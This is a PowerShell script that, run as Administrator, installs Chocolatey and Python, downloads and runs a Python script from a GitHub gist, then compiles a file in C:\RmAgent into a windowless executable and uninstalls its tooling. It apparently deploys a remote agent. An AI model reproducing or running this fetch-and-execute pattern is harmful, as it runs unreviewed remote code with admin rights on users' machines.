if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Error "This script must be run as Administrator!"
    exit 1
}

#──────────────────────────────────────────────────────────────────────────────────────────────────────────#
#                                          Chocolatey configuration

function Remove-Chocolatey {
    if (Get-Command choco -ErrorAction SilentlyContinue) {
        Write-Host "Removing existing Chocolatey..."
        Remove-Item -Recurse -Force "$env:ProgramData\chocolatey" -ErrorAction SilentlyContinue
        $envPath = [Environment]::GetEnvironmentVariable("Path","Machine")
        $newPath = ($envPath.Split(";") | Where-Object {$_ -notlike "*chocolatey*"})
        [Environment]::SetEnvironmentVariable("Path", ($newPath -join ";"), "Machine")
        Write-Host "Chocolatey removed. Restart may be required to refresh PATH."
    } else {
        Write-Host "No existing Chocolatey installation found."
    }
}

function Install-Chocolatey {
    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Installing Chocolatey..."
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Set-ExecutionPolicy Bypass -Scope Process -Force
        try {
            $chocoScript = Invoke-WebRequest -UseBasicParsing 'https://community.chocolatey.org/install.ps1'
            Invoke-Expression $chocoScript.Content
            if (Get-Command choco -ErrorAction SilentlyContinue) {
                Write-Host "Chocolatey installed successfully."
            } else {
                throw "Chocolatey installation failed"
            }
        } catch {
            Write-Error "Failed to install Chocolatey: $_"
            exit 1
        }
    } else {
        Write-Host "Chocolatey is already installed, skipping installation."
    }
}

#──────────────────────────────────────────────────────────────────────────────────────────────────────────#
#                                           Python configuration

function Install-Python {
    Write-Host "Installing Python via Chocolatey..."
    choco install -y python
    if (Get-Command python -ErrorAction SilentlyContinue) {
        Write-Host "Python installed successfully."
    } else {
        Write-Warning "Python not found after installation!"
    }
}

function Install-PythonPackages {
    Write-Host "Installing Python packages: requests, pyinstaller..."
    python -m ensurepip --upgrade
    python -m pip install --upgrade pip
    python -m pip install requests pyinstaller

    try {
        python -c "import tkinter" 2>$null
        Write-Host "tkinter is available."
    } catch {
        Write-Warning "tkinter not available."
    }
}

function Uninstall-Python {
    Write-Host "Uninstalling Python via Chocolatey..."
    choco uninstall -y python
    if (Get-Command python -ErrorAction SilentlyContinue) {
        Write-Warning "Python is still present in the system!"
    } else {
        Write-Host "Python uninstalled successfully."
    }
}

#──────────────────────────────────────────────────────────────────────────────────────────────────────────#
#                                            Script execution

function Run-RemotePythonScript {
    param (
        [string]$url = "https://gist.githubusercontent.com/gnegn/2f3b86c264117e359ea1fad429a7ecda/raw/0661276c7cf6abb7ed688feac9f8de719b969fdc/init.py"
    )

    Write-Host "Downloading remote Python script..."
    $tempFile = [System.IO.Path]::GetTempFileName() + ".py"
    try {
        Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
        Write-Host "Script downloaded to $tempFile"

        Write-Host "Running remote Python script..."
        $processInfo = Start-Process -FilePath python -ArgumentList $tempFile -Wait -NoNewWindow -PassThru
        Write-Host "Remote Python script finished with exit code $($processInfo.ExitCode)"
    } catch {
        Write-Error "Failed to download or run remote script: $_"
        exit 1
    } finally {
        if (Test-Path $tempFile) {
            Remove-Item $tempFile -Force
        }
    }
}

#──────────────────────────────────────────────────────────────────────────────────────────────────────────#
#                                            PyInstaller

function Build-LatestPythonExe {
    param (
        [string]$FolderPath = "C:\RmAgent"
    )

    if (-not (Get-Command pyinstaller -ErrorAction SilentlyContinue)) {
        Write-Host "PyInstaller not found."
        return
    }

    $latestPythonFile = Get-ChildItem -Path $FolderPath -Filter "*.py" -File |
                        Sort-Object CreationTime -Descending |
                        Select-Object -First 1

    if (-not $latestPythonFile) {
        Write-Host "No Python files found in $FolderPath"
        return
    }

    Write-Host "Found last Python file: $($latestPythonFile.FullName)"
    $currentDir = Get-Location

    try {
        Set-Location -Path $FolderPath

        $exeOutputPath = $FolderPath
        $pyinstallerCmd = "pyinstaller --onefile --noconsole --distpath `"$exeOutputPath`" `"$($latestPythonFile.FullName)`""

        Write-Host "Runiing PyInstaller..."
        Invoke-Expression $pyinstallerCmd
    }
    finally {
        Set-Location -Path $currentDir
    }

    $buildFolder = Join-Path $FolderPath "build"
    $specFile = Join-Path $FolderPath ($latestPythonFile.BaseName + ".spec")

    if (Test-Path $buildFolder) { Remove-Item $buildFolder -Recurse -Force }
    if (Test-Path $specFile) { Remove-Item $specFile -Force }

    Write-Host "EXE created in $exeOutputPath"
}




#──────────────────────────────────────────────────────────────────────────────────────────────────────────#
#                                            Main script

Remove-Chocolatey
Install-Chocolatey
Install-Python
Install-PythonPackages

Run-RemotePythonScript
Build-LatestPythonExe

Uninstall-Python
Remove-Chocolatey

Write-Host "`nAll tasks completed successfully."
